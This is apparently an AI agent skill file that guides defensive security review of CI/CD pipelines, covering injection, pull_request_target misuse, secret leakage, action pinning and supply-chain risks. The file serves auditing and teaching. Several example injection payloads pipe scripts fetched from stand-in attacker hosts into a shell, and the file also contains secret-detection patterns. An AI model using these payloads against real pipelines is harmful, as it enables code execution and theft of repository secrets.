---
name: ci-cd-security
description: Secure CI/CD pipeline configuration, secrets management, and supply chain attacks through build systems. Use when reviewing GitHub Actions, GitLab CI, Jenkins, CircleCI pipelines for security issues, injection vulnerabilities, or privilege escalation.
allowed-tools:
  - Bash
  - Read
  - Grep
  - Glob
---

# CI/CD Security Analysis

## When to Use

Use this skill when:
- Auditing CI/CD pipeline configurations
- Reviewing GitHub Actions, GitLab CI, Jenkins pipelines
- Detecting pipeline injection vulnerabilities
- Analyzing secrets management practices
- Checking for supply chain attacks via CI/CD
- Validating artifact signing and provenance
- Assessing permission boundaries and least privilege

## When NOT to Use

Do NOT use for:
- Application code security (use semgrep, codeql, sarif-parsing)
- Infrastructure as Code (separate IaC analysis)
- Container security (use container-specific tools)
- Kubernetes security audits

## Quick Security Check

```bash
# Find all CI/CD config files
find . -name ".github" -o -name ".gitlab-ci.yml" -o -name "Jenkinsfile" -o -name ".circleci"

# Check for exposed secrets
rg -i "password|secret|token|api[_-]?key" .github/workflows/ .gitlab-ci.yml Jenkinsfile

# Check for dangerous patterns
rg "curl.*\|.*sh|wget.*\|.*bash" .github/workflows/ .gitlab-ci.yml
```

## Critical Vulnerabilities

### 1. Script Injection

**Vulnerable Pattern:**
```yaml
# GitHub Actions - CRITICAL VULNERABILITY
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building ${{ github.event.pull_request.title }}"
      # Attacker sets PR title: "; curl attacker.com/steal.sh | bash"
```

**Why it's vulnerable:** User-controlled input (`github.event.*`) flows to shell command without sanitization.

**Safe Pattern:**
```yaml
# Use environment variables (auto-escaped)
- run: echo "Building $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### 2. Pull Request Target Abuse

**Vulnerable Pattern:**
```yaml
# GitHub Actions - allows code execution from forks
name: Build PR
on: pull_request_target  # Runs with write permissions!
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: npm install && npm run build  # Executes attacker's code with repo secrets
```

**Why it's vulnerable:** `pull_request_target` grants write permissions but checks out untrusted code.

**Safe Pattern:**
```yaml
# Use pull_request (read-only) for untrusted code
on: pull_request
# OR use pull_request_target but DON'T checkout PR code
```

### 3. Secrets in Logs

**Vulnerable:**
```yaml
- run: |
    echo "API Key: ${{ secrets.API_KEY }}"
    curl -H "Authorization: ${{ secrets.TOKEN }}" https://api.example.com
```

**Safe:**
```yaml
- run: |
    # Secrets are automatically masked in logs
    curl -H "Authorization: Bearer $API_KEY" https://api.example.com
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

### 4. Untrusted Third-Party Actions

**Vulnerable:**
```yaml
# Using unverified action from random user
- uses: random-user/sketchy-action@master  # No version pinning!
```

**Safe:**
```yaml
# Pin to specific commit SHA (immutable)
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  # Verify with: gh api repos/actions/checkout/commits/b4ffde65f46336ab88eb53be808477a3936bae11
```

## Vulnerability Patterns by Platform

### GitHub Actions

#### Pattern: Environment Variable Injection

```bash
# Find vulnerable env var usage
rg "env:\s*\n.*\${{\s*github\.(event|head)" .github/workflows/ -A 2
```

**Example:**
```yaml
env:
  TITLE: ${{ github.event.issue.title }}  # VULNERABLE
run: echo $TITLE | process.sh
```

#### Pattern: Command Injection via Actions

```bash
# Find dangerous run commands with user input
rg "run:.*\${{.*github\.event" .github/workflows/
```

#### Pattern: Secrets in Pull Requests

```bash
# Find workflows that expose secrets to PRs
rg -A 10 "on:.*pull_request" .github/workflows/ | rg "secrets\."
```

### GitLab CI

#### Pattern: Script Injection

```yaml
# .gitlab-ci.yml - VULNERABLE
build:
  script:
    - echo "Building branch $CI_COMMIT_REF_NAME"
    # Attacker creates branch: main; curl evil.com/backdoor.sh | sh
```

**Safe:**
```yaml
build:
  script:
    - echo "Building branch ${CI_COMMIT_REF_NAME@Q}"  # Shell quoting
```

#### Pattern: Token Exposure

```bash
# Find hardcoded tokens
rg "glpat-[A-Za-z0-9_-]{20}" .gitlab-ci.yml
```

### Jenkins

#### Pattern: Groovy Injection

```groovy
// Jenkinsfile - VULNERABLE
pipeline {
    stages {
        stage('Build') {
            steps {
                script {
                    def title = env.CHANGE_TITLE
                    sh "echo ${title}"  // Injection point
                }
            }
        }
    }
}
```

**Safe:**
```groovy
sh "echo '${title.replace("'", "'\\''")}'"  // Escape quotes
// OR
sh script: "echo \$TITLE", env: ["TITLE=${title}"]
```

## Secrets Management

### Finding Secrets in Config

```bash
# High-confidence secret patterns
rg -i "(?i)(password|secret|token|api[_-]?key|private[_-]?key)\s*[:=]\s*['\"]?[a-zA-Z0-9]{20,}" .

# GitHub PATs
rg "ghp_[a-zA-Z0-9]{36}" .

# AWS keys
rg "AKIA[0-9A-Z]{16}" .

# Private keys
rg "BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY" .
```

### Secret Scanning Tools

```bash
# Gitleaks
gitleaks detect --source . --report-format json --report-path gitleaks-report.json

# TruffleHog
trufflehog filesystem . --json > trufflehog-report.json

# Detect-secrets
detect-secrets scan --all-files > .secrets.baseline
```

### Proper Secrets Usage

**GitHub Actions:**
```yaml
# ✅ CORRECT
steps:
  - run: |
      curl -H "Authorization: Bearer $TOKEN" https://api.example.com
    env:
      TOKEN: ${{ secrets.API_TOKEN }}

# ❌ WRONG (logged in plaintext)
steps:
  - run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.com
```

**GitLab CI:**
```yaml
# ✅ CORRECT
variables:
  API_TOKEN:
    value: ${CI_JOB_TOKEN}
    masked: true

# ❌ WRONG (not masked)
variables:
  API_TOKEN: my-secret-token
```

## Permission Analysis

### GitHub Actions Permissions

**Find overly permissive workflows:**
```bash
# Find workflows without explicit permissions
rg "on:\s*(push|pull_request)" .github/workflows/ | \
  grep -v "permissions:" | \
  grep -v "permissions: {}"
```

**Least Privilege Template:**
```yaml
name: Secure Build
on: pull_request

permissions:
  contents: read       # Only read code
  pull-requests: read  # Only read PR metadata
  # NO write permissions

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

**Dangerous Permissions:**
```yaml
# AVOID THESE
permissions:
  contents: write      # Can push to repo
  packages: write      # Can publish packages
  id-token: write      # Can assume cloud roles (AWS, GCP, Azure)
  actions: write       # Can modify workflows
```

### GitLab CI Permissions

```yaml
# Least privilege with protected variables
variables:
  DEPLOY_TOKEN: $PROTECTED_DEPLOY_TOKEN  # Only available on protected branches

deploy:
  only:
    - main  # Only run on protected branch
  script:
    - deploy.sh
```

## Supply Chain Attacks via CI/CD

### Attack Vector 1: Dependency Confusion

```yaml
# Attacker uploads malicious package to public registry
# Pipeline installs it instead of private package
- run: npm install @company/internal-lib
  # If public npm has @company/internal-lib with higher version → supply chain attack
```

**Detection:**
```bash
# Check if private package names exist publicly
jq -r '.dependencies | keys[]' package.json | while read pkg; do
  echo "Checking $pkg on public npm..."
  curl -s "https://registry.npmjs.org/$pkg" | jq -e '.name' && echo "⚠️ FOUND ON PUBLIC REGISTRY"
done
```

**Mitigation:**
```yaml
# Pin to private registry
- run: npm config set @company:registry https://npm.internal.company.com
- run: npm install @company/internal-lib
```

### Attack Vector 2: Compromised Build Tools

```yaml
# Using unverified builder
- run: curl https://random-site.com/install.sh | sh
```

**Safe Approach:**
```yaml
# Pin to specific versions with checksums
- run: |
    curl -LO https://releases.example.com/tool-v1.2.3
    echo "a1b2c3d4... tool-v1.2.3" | sha256sum --check
    chmod +x tool-v1.2.3
```

### Attack Vector 3: Artifact Tampering

**Vulnerable:**
```yaml
# No signature verification
- run: docker pull company/app:latest
- run: docker run company/app:latest
```

**Secure:**
```yaml
# Verify signatures with cosign
- run: |
    docker pull company/app:latest
    cosign verify --key cosign.pub company/app:latest
    docker run company/app:latest
```

## SLSA Compliance

Generate provenance for artifacts:

```yaml
# GitHub Actions - Generate SLSA provenance
name: Release
on:
  push:
    tags: ['v*']

permissions:
  id-token: write  # For signing
  contents: write  # For releasing

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make build
      - uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
        with:
          artifacts: dist/app
```

## Vulnerability Scanning

### Automated Pipeline Security Scan

```bash
# Checkov (IaC security for CI/CD)
checkov -d .github/workflows/ --framework github_actions

# actionlint (GitHub Actions linter)
actionlint .github/workflows/*.yml

# GitLab CI linter
curl -X POST "https://gitlab.com/api/v4/ci/lint" \
  -F "content=@.gitlab-ci.yml"
```

## Common Pitfalls

### Pitfall 1: Using pull_request_target Incorrectly

**Wrong:**
```yaml
on: pull_request_target  # Write permissions
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Attacker's code
  - run: npm install && npm test  # RCE with write permissions
```

**Correct:**
```yaml
on: pull_request  # Read-only
steps:
  - uses: actions/checkout@v4  # Automatically checks out PR
  - run: npm install && npm test  # Safe, no write permissions
```

### Pitfall 2: Exposing Secrets to Logs

**Wrong:**
```yaml
- run: echo "Token is ${{ secrets.TOKEN }}"  # LOGGED
```

**Correct:**
```yaml
- run: echo "Token is configured"  # Don't log secrets
  env:
    TOKEN: ${{ secrets.TOKEN }}  # Auto-masked if printed
```

### Pitfall 3: No Action Version Pinning

**Wrong:**
```yaml
- uses: actions/checkout@main  # Can change at any time
```

**Correct:**
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1 (immutable)
```

## Rationalizations to Reject

| Shortcut | Why It's Wrong |
|----------|----------------|
| "It's just CI, not production" | CI has access to secrets, can deploy to production, and is a prime attack vector |
| "We trust our contributors" | Even trusted contributors can have compromised accounts |
| "We'll fix it after launch" | CI/CD vulnerabilities enable supply chain attacks affecting all users |
| "Official actions are always safe" | Popular actions get targeted (see codecov incident) |
| "Secrets are only in environment variables" | Secrets can leak through logs, artifacts, cache, error messages |

## Report Template

```markdown
# CI/CD Security Audit Report

## Critical Findings

### 1. Script Injection in PR Title
**File:** `.github/workflows/build.yml:15`
**Severity:** CRITICAL
**Description:** User-controlled PR title flows to shell command
**PoC:** Create PR with title: `"; curl attacker.com/steal | sh"`
**Fix:** Use environment variables with auto-escaping

### 2. Secrets Exposed to Pull Requests
**File:** `.github/workflows/test.yml:8`
**Severity:** HIGH
**Description:** Workflow exposes `AWS_SECRET_KEY` to untrusted PRs
**Fix:** Remove secret access from PR builds or use `pull_request_target` carefully

## Summary Statistics
- **Total Workflows:** 12
- **Critical Issues:** 2
- **High Issues:** 5
- **Medium Issues:** 8
- **Hardcoded Secrets:** 3
- **Unpinned Actions:** 15

## Recommended Fixes
[Prioritized list of remediations]
```

## Resources

- GitHub Actions Security: https://docs.github.com/en/actions/security-guides
- SLSA Framework: https://slsa.dev/
- Sigstore (artifact signing): https://www.sigstore.dev/
- Checkov: https://www.checkov.io/
- actionlint: https://github.com/rhysd/actionlint
- Related Skills: supply-chain-security, sharp-edges
